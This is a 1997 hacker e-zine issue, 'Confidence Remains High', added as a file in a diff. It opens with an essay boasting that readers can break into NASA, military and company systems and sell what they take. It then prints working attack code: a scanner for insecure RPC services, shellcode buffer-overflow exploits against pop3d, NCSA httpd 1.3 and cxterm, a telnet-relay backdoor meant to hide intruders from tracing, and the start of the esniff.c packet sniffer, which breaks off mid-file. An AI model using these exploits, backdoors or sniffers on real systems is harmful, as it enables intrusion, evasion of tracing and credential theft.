@@ -1,0 +1,1781 @@
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                             .oO The CodeZero Oo.
+                             .oO   Presents   Oo.
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Welcome to the special summer editon of...
+
+       /IIIIIIIIII          /IIIIIIIIII           /III   /III
+       \ III_____/          \ III___/III          \ III  \ III
+        \ III                \ III  \ III          \ III  \_III
+         \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
+          \ III                \ III__/III           \ III__/ III
+           \ III                \ III  \ III          \ III  \ III
+            \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
+             \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
+                          \/__/                \/__/                 \/__/
+
+                                                                 Summer 1997.
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+                          CRH Editor : Tetsu Khan
+           Official CRH Kung-Fu Film : Turf On A Rope
+                   Official CRH Pimp : so1o
+    Official CRH Spic With A Red Hat : xFli
+       Official CRH T-Shirt Supplier : NightRage
+     Official CRH Visual Basic Coder : \\StOrM\\ aka Jason Sloderbeck
+          Official CRH Print Brother : Digital Darkness
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                  
+                   .-----------[ An Official ]-----------.
+                   :      .-----.  .----.   .--.--.      :
+                   :      :  .--'  : .-. :  :  :  :      :
+                   !_-::  :  :     : `-' ;  :  .  :  ::-_!
+                   :~-::  :: :     :: . :   ::    :  ::-~:
+                   :      ::.`--.  ::.:  :  ::.:  :      :
+                   :      `-----'  `--'--'  `--'--'      :
+                   !_-::                             ::-_!
+                   :~-::-[ Confidence Remains High ]-::-~:
+                   :~-::                             ::-~:
+                   `-----------[ Production ]------------'
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  In This "Added Exploits" Issue :
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ -----=>  Section A  :  Introduction And Cover Story.
+
+ 1. Confidence Remains High special summer edition.....: Tetsu Khan
+ 2. The network is our playground......................: so1o
+
+ -----=>  Section B  :  Exploits And Code.
+
+ 1. RPC-Check.sh.......................................: yo
+ 2. Linux pop3 remote exploit..........................: Savage
+ 3. Linux HTTPD 1.3 remote.............................: Savage
+ 4. Telnet gateway.....................................: Chaos
+ 5. 0wned.c............................................: so1o
+ 6. Cxterm exploit for Linux...........................: Ming Zhang
+ 7. The king of all sniffers : esniff.c................: unknown
+ 8. Linux nlspath exploit..............................: Solar Designer
+
+ -----=>  Section C  :  Phones / Scanning / Radio.
+
+ 1. How to fuck over a UK payphone.....................: so1o / NightRage
+ 2. Radio link for TI-85 calculators...................: Michael Jan
+
+ -----=>  Section D  :  Miscellaneous.
+
+ 1. Test-cgi holes.....................................: so1o
+ 2. Tree raping........................................: digitalboy [DD]
+ 3. .htpasswd + .htaccess..............................: Cain [DD]
+ 4. Simple NFS skills..................................: Cain [DD]
+
+ -----=>  Section E  :  World News.
+
+ 1. LOPHT.COM..........................................: so1o
+ 2. AAA Report.........................................: so1o
+ 3. Lamer of the fucking year : pSId (DALnet)..........: so1o
+
+ ------=> Section F  :  Projects.
+
+ 1. STiK...............................................: mstrhelix
+
+ -----=> Section G  :  The End. (+ Personal Column)
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ 1. Confidence Remains High Issue 4 : Tetsu Khan
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Issue 4 will be out at the beginning of September, so to last you through
+the long hot summer nights, we present the special summer issue of
+Confidence Remains High.
+
+Nothing really new in this edition, just a few programs to keep you thinking
+through the summer, as well as some cool submissions by members of Digital
+Darkness. But when you bundle this with CRH issue 3, it becomes cool :)
+
+  Confidence Remains High distro site list...
+  -------------------------------------------
+
+    http://insecurity.insecurity.org/codez/
+    http://www.r0ot.org
+    http://www.exceed.net
+    http://www.7thsphere.com/hpvac/hacking.html
+
+    ftp://ftp.sekurity.org/users/so1o/
+
+    ...And alot of other sites, just go looking around.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. The network is our playground : so1o
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Just sit back for a few minutes and consider how much power we have as hackers,
+from our Linux boxes, or Wind0ze systems, we can connect to many thousands of
+Government or Military sites, as well as company networks where useful
+information such as credit card details can easily be found, all we need is
+the knowledge of holes in such systems, the means to exploit these holes, and
+the skills needed to "root" the system, thats all it takes.
+
+In 15 minutes, a hacker could 0wn many important NASA systems, and then proceed
+to pull the following types of files from such a system...
+
+ - Personnel information.
+ - Mission reports and test results.
+ - Satellite programs and information.
+ - Future mission dates.
+
+Or say it was a military system, then that hacker, if he knew what he was doing
+would be able to gain access (with relative ease) to the following kinds of
+files...
+
+ - Personnel information.
+ - Weapons reports.
+ - Tactical analysis.
+ - Future mission dates.
+ - Intelligence papers.
+
+
+Lets say that a hacker was to attack a company, such as Intel, then he would
+be able to access...
+
+ - Product test results.
+ - Internal mail between users.
+ - Future plans or products.
+ - Blueprints.
+
+... then that hacker could sell off that companies research and development
+    reports to others, and make some ca$h.
+
+It is clear to see, that from the power we have by just owning a computer and
+a modem is quite huge in the right hands, and that it is pretty simple to go
+out and find yourself some classified information if you really want to.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ 1. RPC-Check.sh : yo
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+#!/bin/sh
+#rpc.chk 1.0
+#
+# Make sure you have got a newer version of Bourne Shell (SVR2 or newer)
+# that supports functions. It's usually located in /bin/sh5 (under ULTRIX OS)
+# or /bin/sh (Sun OS, RS/6000 etc) If it's located elsewhere, feel free to
+# change the magic number, indicating the type of executable Bourne Shell.
+#
+# The script obtains via nslookup utility a list of hostnames from a nameserver
+# and checks every entry of the list for active rexd procedures as well as
+# ypserver procedures. The output is a list of the sites that run those
+# daemons and are insecure.
+#  -yo.
+
+
+domainname=$1
+umask 022
+PATH=/bin:/usr/bin:/usr/ucb:/usr/etc:/usr/local/bin ; export PATH
+
+#
+# Function collects a list of sites
+# from a nameserver. Make sure you've got the nslookup utility.
+#
+get_list() {
+(
+echo set type=ns
+echo $domainname
+) | nslookup | egrep "nameserv" | cut -d= -f2> .tmp$$  2>/dev/null
+if [ ! -s .tmp$$ ]; then
+echo "No such domain" >&2
+echo "Nothing to scan" >&2
+exit 1
+fi
+for serv in `cat .tmp$$`;do
+(
+echo server $serv
+echo ls  $domainname
+) | nslookup > .file$$ 2>/dev/null
+lines=`cat .file$$ | wc -l`
+tail -`expr $lines  - 7` .file$$  | cut -d" " -f2 > .file.tmp # .file
+sed -e "s/$/.$domainname/"  .file.tmp > .hosts$$
+rm -rf .file* .tmp$$
+sort .hosts$$ | uniq -q >> HOSTS$$; rm -rf .hosts$$
+done
+tr 'A-Z' 'a-z' <HOSTS$$ |sort|uniq -q > HOSTS.$domainname;rm -rf HOSTS$$
+}
+
+# Function
+
+rpc_calls()
+{
+for entry in `cat HOSTS.$domainname`; do
+(
+rpcinfo -t $entry ypserv >/dev/null  && echo $entry runs YPSERV ||  exit 1 # Error!
+) >> .log  2>/dev/null
+(
+rpcinfo -t $entry rex >/dev/null && echo $entry runs REXD ||  exit 1 # Error !
+ ) >> .log  2>/dev/null
+done
+}
+
+# Main
+
+if [ "$domainname" = '' ];  then
+echo "Usage $0 domainname" >&2
+exit 1
+fi
+get_list
+echo "Checking $domainname domain" > .log
+echo "*****************************" >> .log
+echo "Totally `cat HOSTS.$domainname | wc -l` sites  to scan" >> .log
+echo "******************************" >> .log
+echo "started at `date`" >> .log
+echo "******************************" >> .log
+rpc_calls
+echo "******************************" >> .log
+echo "finished at `date`"  >> .log
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. Linux pop3 remote exploit : Savage
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+ * pop3d Linux/intel remote xploit by savage@apostols.org 1997-April-05
+ *
+ * workz fine against old pop3d distributed with pine.
+ *
+ * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and the rest of ToXyn !!!
+ *
+ * usage:
+ *	$ (imap 0; cat) | nc victim 143
+ *              |
+ *              +--> usually from -100 to 100
+ */
+
+#include <stdio.h>
+
+char shell[] = 
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
+"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
+"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\xe8\xc0\xff\xff\xff/bin/sh";
+
+char username[1024+255];
+
+void main(int argc, char *argv[]) {
+	int i,a;
+	long val;
+	
+	if(argc>1)
+		a=atoi(argv[1]);
+	else
+		a=0;
+	
+	strcpy(username,shell);
+	
+	for(i=strlen(username);i<sizeof(username);i++)
+		username[i]=0x90; /* NOP */
+
+	val = 0xbffff501 + a;
+
+	for(i=1024;i<strlen(username)-4;i+=4) 
+	{
+		username[i+0] = val & 0x000000ff;
+		username[i+1] = (val & 0x0000ff00) >> 8;
+		username[i+2] = (val & 0x00ff0000) >> 16;
+		username[i+3] = (val & 0xff000000) >> 24;
+	}
+	
+	username[ sizeof(username)-1 ] = 0;
+	
+        printf("USER %s\nPASS Yoshemite\n", username);
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  3. Linux HTTPD 1.3 remote : Savage
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+ * NCSA 1.3 Linux/intel remote xploit by savage@apostols.org 1997-April-23
+ *
+ * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore,EDevil and the rest of ToXyn !!!
+ *
+ * usage:
+ *	$ (hackttpd 0; cat) | nc victim 143
+ *                  |
+ *                  +--> usually from -1000 to 1000 (try steeps of 100)
+ */
+
+#include <stdio.h>
+
+unsigned char shell[] = {
+'/',0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
+0xeb,0x27,0x5e,0x31,0xed,0x31,0xc9,0x31,0xc0,0x88,0x6e,6,0x89,0xf3,0x89,0x76,
+0x24,0x89,0x6e,0x28,0x8d,0x6e,0x24,0x89,0xe9,0x8d,0x6e,0x28,0x89,0xea,0xb0,0x0b,
+0xcd,0x80,0x31,0xdb,0x89,0xd8,0x40,0xcd,0x80,0xe8,0xd4,0xff,0xff,0xff,
+'b','i','n','/','s','h'
+};
+
+char username[256+8];
+
+void main(int argc, char *argv[]) {
+	int i,a;
+	long val;
+	
+	if(argc>1)
+		a=atoi(argv[1]);
+	else
+		a=0;
+	
+	strcpy(username,shell);
+	
+	for(i=strlen(shell);i<sizeof(username);i++)
+		username[i]=0x90; /* NOP */
+
+	val = 0xbfff537c + 4 + a; 
+
+	i=sizeof(username)-4;
+	{
+		username[i+0] = val & 0x000000ff;
+		username[i+1] = (val & 0x0000ff00) >> 8;
+		username[i+2] = (val & 0x00ff0000) >> 16;
+		username[i+3] = (val & 0xff000000) >> 24;
+	}
+	
+	username[ sizeof(username) ] = 0;
+	
+        printf("GET %s\n/bin/bash -i 2>&1;\n", username);
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ 4. Telnet gateway : Chaos
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+   (--------------------------------------------------------)
+
+                         Telnet Gateway
+                            by Chaos
+
+   (--------------------------------------------------------)
+
+     Ever worry about some egotistical sysadmin getting pissed off
+when you hack his system, and having him trace it back to your
+local system?  If you are like most hackers, even if you are
+careful and telnet through another system first, it is still fairly
+easy to trace back through.  Using the following program bellow you
+can make it a real bitch for anyone to find where you are coming
+from, let alone what account.  This program, which has only been
+tested on Sun OS, will allocate a port and set up a telnet gateway.
+Because this program only allocates a socket, in order for someone
+to trace it back to you, the sysadmin of the system it is set up on
+would have to monitor the socket and see where the connection is
+coming from, which is not very likely, the sysadmin already has
+plenty to do.  This is setup currently to port 6969 and will run in
+the background.  Be sure to call it something that will not gather
+any suspicion from anyone running ps -aux.  This will also write to
+the file log, the date and time anyone uses the telnet gateway.
+Have phun!
+
+Thanks go out to al- for the original source code.
+
+*/
+
+#include <sys/fcntl.h>
+#include <stdio.h>
+#include <ctype.h>
+#include <sys/wait.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+
+FILE *errfd;
+
+static int serfd;
+struct sockaddr_in   addr;
+char buffer[10][80];
+int sockused[10];
+int numports = 10;
+int numproc=0;
+
+died()
+{
+  numproc--;
+  wait3(NULL,WNOHANG,NULL);
+  signal(SIGCLD,died);
+  return;
+}
+
+init_io()
+{
+
+  signal(SIGCLD,died);
+
+  if ((serfd = socket(AF_INET,SOCK_STREAM,0)) <0 )
+    return(1);
+
+
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = INADDR_ANY;
+  addr.sin_port = 6969;
+
+
+  if (bind(serfd,(struct sockaddr *)&addr, sizeof(addr)))
+  {
+    fprintf(errfd,"ioinit  cannot bind socket\n");
+    exit(1);
+  }
+
+  if (listen(serfd,5) == -1)
+  {
+    fprintf(errfd,"ioinit  cannot listen at socket\n");
+    return(1);
+  }
+
+  return(0);
+}
+
+getconnect()
+{
+  int s,length;
+  struct sockaddr_in address;
+
+  while(1)
+  {
+    length= sizeof addr;
+    while ((s= accept(serfd,&address,&length))<0);
+    wait3(NULL,WNOHANG,NULL);
+    if (fork() == 0) /* child */
+    {
+        system("date >>log");
+        numproc++;
+        dup2(s,0);
+        dup2(s,1);
+        dup2(s,2);
+        close(s);
+        system("exec telnet");
+        kill(getpid(),SIGKILL);
+
+        close(0);
+        close(1);
+        close(2);
+        exit;
+    }                /* end child */
+
+    close(s);
+    wait3(NULL,WNOHANG,NULL);
+  }
+}
+
+main()
+{
+  int i;
+  char temp[80],*term;
+  int fd;
+
+  for(i=0;i<36;i++) close(i);
+
+  errfd=fopen("ERR","w");
+  if(errfd==NULL) return(-1);
+  setsid();
+  if(fork()!=0) return(-1);
+  init_io();
+  getconnect();
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  5. 0wned.c : so1o
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*       THIS IS FUCKING PRIVATE SHIT, DONT DISTRIBUTE IT!@#        */
+/* I CODED THIS QUICKLY ONE NIGHT, IT WILL ROOT ANY LINUX 2.0.x BOX */
+/*               -D-O- -N-O-T- -D-I-S-T-R-I-B-U-T-E-                */
+/*                      so1o@insecurity.org                         */
+
+main()
+
+{
+        char a1='j',a2='0',a3='a',a4='r',a5='3';
+        char b1='w',b2='n',b3='d';
+        printf("%c%c%c %c%c%c\n",a1,a2,a2,a3,a4,a5);
+        printf("%c %c %c %c %c\n\n",a2,b1,b2,a5,b3);
+        printf("By so1o@insecurity.org 1997\n");
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  6. Cxterm exploit for Linux : Ming Zhang
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+
+   cxterm buffer overflow exploit for Linux.  This code is tested on
+   both Slackware 3.1 and 3.2.
+
+                                        Ming Zhang
+                                        mzhang@softcom.net
+*/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+#define CXTERM_PATH "/usr/X11R6/bin/cxterm"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+#define NOP_SIZE 1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc,char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i,OffSet = DEFAULT_OFFSET;
+
+/* use a different offset if you find this program doesn't do the job */
+   if (argc>1) OffSet = atoi(argv[1]);
+
+   buff = malloc(2048);
+   if(!buff)
+   {
+      printf("Buy more RAM!\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE;
+i+=NOP_SIZE) {
+        memcpy (ptr,nop,NOP_SIZE);
+        ptr+=NOP_SIZE;
+   }
+
+   for(i=0;i < strlen(shellcode);i++)
+      *(ptr++) = shellcode[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_sp() + OffSet;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   (void) fprintf(stderr,
+         "This bug is discovered by Ming Zhang
+(mzhang@softcom.net)\n");
+    /* Don't need to set ur DISPLAY to exploit this one, cool huh? */
+    execl(CXTERM_PATH, "cxterm", "-xrm",buff, NULL);
+}
+
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  7. The king of all sniffers : esniff.c : unknown
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/* [JOIN THE POSSE!] */
+
+/* Esniff.c */
+
+#include <stdio.h>
+#include <ctype.h>
+#include <string.h>
+
+#include <sys/time.h>
+#include <sys/file.h>
+#include <sys/stropts.h>
+#include <sys/signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+
+#include <net/if.h>
+#include <net/nit_if.h>
+#include <net/nit_buf.h>
+#include <net/if_arp.h>
+
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_var.h>
+#include <netinet/udp_var.h>
+#include <netinet/in_systm.h>
+#include <netinet/tcp.h>
+#include <netinet/ip_icmp.h>
+
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#define ERR stderr
+
+char    *malloc();
+char    *device,
+        *ProgName,
+        *LogName;
+FILE    *LOG;
+int     debug=0;
+
+#define NIT_DEV     "/dev/nit"
+#define CHUNKSIZE   4096        /* device buffer size */
+int     if_fd = -1;
+int     Packet[CHUNKSIZE+32];
+
+void Pexit(err,msg)
+int err; char *msg;
+{ perror(msg);
+  exit(err); }
+
+void Zexit(err,msg)
+int err; char *msg;
+{ fprintf(ERR,msg);
+  exit(err); }
+
+#define IP          ((struct ip *)Packet)
+#define IP_OFFSET   (0x1FFF)
+#define SZETH       (sizeof(struct ether_header))
+#define IPLEN       (ntohs(ip->ip_len))
+#define IPHLEN      (ip->ip_hl)
+#define TCPOFF      (tcph->th_off)
+#define IPS         (ip->ip_src)
+#define IPD         (ip->ip_dst)
+#define TCPS        (tcph->th_sport)
+#define TCPD        (tcph->th_dport)
+#define IPeq(s,t)   ((s).s_addr == (t).s_addr)
+
+#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))
+
+#define MAXBUFLEN  (128)
+time_t  LastTIME = 0;
+
+struct CREC {
+     struct CREC *Next,
+                 *Last;
+     time_t  Time;              /* start time */
+     struct in_addr SRCip,
+                    DSTip;
+     u_int   SRCport,           /* src/dst ports */
+             DSTport;
+     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
+     u_int   Length;            /* current data length */
+     u_int   PKcnt;             /* # pkts */
+     u_long  LASTseq;
+};
+
+struct CREC *CLroot = NULL;
+
+char *Symaddr(ip)
+register struct in_addr ip;
